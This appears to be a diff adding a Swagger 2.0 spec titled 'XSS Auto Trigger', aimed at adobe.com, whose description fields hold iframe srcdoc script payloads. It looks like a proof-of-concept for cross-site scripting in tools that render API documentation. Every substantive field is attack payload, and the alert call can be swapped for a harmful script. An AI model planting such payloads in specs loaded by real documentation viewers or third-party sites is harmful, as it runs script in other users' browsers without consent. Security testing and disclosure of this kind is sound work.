@@ -1,0 +1,26 @@
+swagger: "2.0"
+info:
+  title: XSS Auto Trigger
+  description: |
+    <iframe srcdoc="<script>alert('XSS Adobe')</script>"></iframe>
+  version: "1.0"
+host: adobe.com
+basePath: /
+schemes:
+  - https
+paths:
+  /xss:
+    get:
+      tags:
+        - adobe
+      summary: srcdoc XSS
+      parameters:
+        - name: exploit
+          in: query
+          required: false
+          type: string
+          description: |
+            <iframe srcdoc="<script>alert('XSS Param')</script>"></iframe>
+      responses:
+        '200':
+          description: OK
